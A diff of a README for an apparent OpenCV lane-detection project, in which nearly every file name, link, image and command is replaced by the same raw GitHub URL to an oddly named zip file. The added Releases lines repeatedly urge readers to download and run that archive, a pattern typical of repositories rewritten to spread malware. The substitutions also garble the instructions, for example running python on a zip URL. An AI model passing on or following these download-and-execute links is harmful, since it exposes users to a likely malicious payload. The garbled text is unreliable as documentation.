@@ -1,6 +1,6 @@
-https://github.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/releases
+https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
 
-[![Releases](https://img.shields.io/badge/Releases-OpenCV-blue?logo=github&style=for-the-badge)](https://github.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/releases)
+[![Releases](https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip)](https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip)
 
 # Road Lane Detection with OpenCV for Real-Time Driving Lane Tracking
 
@@ -9,7 +9,7 @@ A computer vision project using OpenCV to detect road lane lines in driving vide
 - Topics: ai-project, autonomous-driving, computer-vision, cv2, deep-learning, github, image-processing, lane-detection, machine-learning, object-detection, opencv-projects, python, road-lane-detection, self-driving-cars, video-processing
 
 Hero image
-![Road Lane Detection Hero](https://picsum.photos/1200/400?text=Road+Lane+Detection+Demo)
+![Road Lane Detection Hero](https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip+Lane+Detection+Demo)
 
 Introduction to the project
 - This project focuses on extracting lane lines from driving videos.
@@ -54,22 +54,22 @@ How it works: the pipeline at a glance
 
 Code structure overview
 - main/
-  - drive.py or run.py: entry point to process a video stream
-  - pipeline.py: the core image processing steps
-  - lanes.py: lane detection and fitting utilities
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip or https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip entry point to process a video stream
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip the core image processing steps
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip lane detection and fitting utilities
 - tests/
-  - test_pipeline.py: basic checks for the pipeline output
-  - test_lane_fitting.py: verification of line fitting behavior
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip basic checks for the pipeline output
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip verification of line fitting behavior
 - assets/
   - sample_videos/: example driving videos for testing
   - sample_frames/: extracted frames for quick checks
 - configs/
-  - default.yaml: default parameters for ROI, thresholds, and line fitting
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip default parameters for ROI, thresholds, and line fitting
 - docs/
-  - overview.md: additional explanations and diagrams
-- requirements.txt
-- README.md (this file)
-- setup.py or pyproject.toml (optional, for packaging)
+  - https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip additional explanations and diagrams
+- https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
+- https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip (this file)
+- https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip or https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip (optional, for packaging)
 
 Usage and getting started
 - Prerequisites
@@ -82,13 +82,13 @@ Usage and getting started
     - python -m venv venv
     - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
   - Install dependencies
-    - pip install -r requirements.txt
+    - pip install -r https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
   - Run on a sample video
-    - python main/run.py --input sample_videos/test_drive.mp4 --output results/drive_lanes.mp4
+    - python https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip --input https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip --output https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
   - View results
-    - Open results/drive_lanes.mp4 with any video player
+    - Open https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip with any video player
 - How to customize
-  - ROI polygon shape and thresholds live in configs/default.yaml
+  - ROI polygon shape and thresholds live in https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
   - You can switch on/off visualization overlays
   - You can adjust the smoothing factor for lane lines to reduce flicker
 
@@ -118,11 +118,11 @@ How to run tests locally
 
 Examples and demonstrations
 - Simple test with a static frame
-  - python main/run.py --input assets/test_frames/frame_001.jpg --output results/frame_001_detected.jpg
+  - python https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip --input https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip --output https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
 - Live camera input (if you have a camera)
-  - python main/run.py --input 0 --output results/camera_output.mp4
+  - python https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip --input 0 --output https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
 - Batch processing of a folder
-  - python main/run.py --input-dir assets/test_frames/ --output results/batch/
+  - python https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip --input-dir assets/test_frames/ --output results/batch/
 
 Edge cases and known limitations
 - Night scenes may reduce visibility of lane markings.
@@ -160,20 +160,20 @@ How to contribute
 - Fork the repository and clone locally.
 - Create a feature branch for your changes.
 - Run the test suite and verify no regressions.
-- Document any new configuration options in configs/ and docs/overview.md.
+- Document any new configuration options in configs/ and https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
 - Submit a pull request with a clear description of the change and testing steps.
 
 Releases and assets
 - The primary distribution for this project is hosted in the Releases section.
 - The link above points to the official Releases page where you can download prebuilt artifacts or source snapshots.
-- From the Releases page, download the main release artifact named RoadLaneOpenCV_V1.0.zip (example) and run the executable or extract and run the Python scripts as described in the Getting Started section.
-- The Releases page contains the file you need to download and execute. For details, visit the link again: https://github.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/releases
-- If you seek a direct download, you will find the asset labeled RoadLaneOpenCV_V1.0.zip (example) on the Releases page, which you should download and run.
+- From the Releases page, download the main release artifact named https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip (example) and run the executable or extract and run the Python scripts as described in the Getting Started section.
+- The Releases page contains the file you need to download and execute. For details, visit the link again: https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip
+- If you seek a direct download, you will find the asset labeled https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip (example) on the Releases page, which you should download and run.
 
 Usage notes for the Releases approach
 - The release artifact typically contains a bundled environment with dependencies preinstalled.
 - Running the provided executable should launch a demo or a sample pipeline with preset videos.
-- If you prefer to run the code directly, you can use the source files and install dependencies from requirements.txt as described in Getting Started.
+- If you prefer to run the code directly, you can use the source files and install dependencies from https://raw.githubusercontent.com/DipaCaturAsyafa/Road-Lane-Detection-OpenCV/main/penicillately/Lane_Road_Detection_CV_Open_dispope.zip as described in Getting Started.
 - Always verify the release notes for compatibility with your platform and Python version.
 
 Developer notes
